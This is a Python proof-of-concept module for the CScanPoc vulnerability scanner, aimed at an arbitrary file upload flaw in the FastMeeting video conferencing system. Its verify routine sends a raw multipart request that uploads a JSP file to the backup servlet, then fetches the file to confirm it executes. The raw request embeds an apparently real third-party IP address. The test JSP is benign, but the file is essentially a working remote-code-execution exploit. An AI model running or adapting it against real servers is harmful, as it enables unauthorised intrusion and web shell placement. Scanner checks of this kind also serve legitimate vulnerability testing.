# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'FastMeeting_0001'  # 平台漏洞编号，留空
    name = '好视通FastMeeting视频会议系统任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-08-12'  # 漏洞公布时间
    desc = '''
        好视通FastMeeting视频会议系统任意文件上传。
        缺陷地址:/AdminMgr/backup/databackup.jsp
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0132866'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FastMeeting'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a897ff33-d686-4567-8092-62380609be67'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2010-0132866
            hh = hackhttp.hackhttp()
            arg = self.target
            upload_url = arg + '/dbbackup/servlet/backupServlet?action=sc'
            raw = '''
POST /dbbackup/servlet/backupServlet?action=sc HTTP/1.1
Host: 221.7.222.164:8080
Content-Length: 285
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://221.7.222.164:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVsQhvGjUy0npvhbo
Referer: http://221.7.222.164:8080/dbbackup/adminMgr/fileupload.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8

------WebKitFormBoundaryVsQhvGjUy0npvhbo
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: text/plain

<%@ page import="java.util.*,java.io.*" %>
<%@ page import="java.io.*"%>
<% out.println("testvul");%>
------WebKitFormBoundaryVsQhvGjUy0npvhbo--
            '''
            code, head, res, err, _ = hh.http(upload_url, raw=raw)
            if code == 302 and 'info=upsucc' in head:
                verify_url = arg + '/dbbackup/backup/test.jsp'
                code, head, res, err, _ = hh.http(verify_url)
                if code == 200 and 'testvul' in res:
                    #security_hole('Arbitrarilly file upload: '+arg+'AdminMgr/backup/databackup.jsp')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
